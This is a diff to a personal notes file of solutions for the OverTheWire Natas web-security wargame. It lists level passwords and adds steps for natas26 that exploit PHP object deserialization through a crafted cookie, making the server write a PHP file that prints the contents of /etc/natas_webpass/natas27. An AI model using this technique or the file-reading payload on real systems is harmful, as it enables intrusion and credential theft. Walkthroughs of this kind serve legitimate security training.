@@ -146,3 +146,11 @@ natas25 -> ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws:
 		<?php print file_get_contents('/etc/natas_webpass/natas26'); ?>
 	
 natas26 -> cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE:
+	Copy Logger code into an environment capable of executing PHP
+	Change exitMsg in constructor to "<?php print file_get_contents('/etc/natas_webpass/natas27') ?>"
+	Change logFile to "img/[some_file_name].php"
+	Execute "print base64_encode(serialize(new Logger('/test/path')));"
+	Take the output and insert it into a get request as the "drawing" cookie on the main page
+	The file [some_file_name] now exists and contains the password (twice)
+
+natas27 -> u3RRffXjysjgwFU6b9xa23i6prmUsYne:
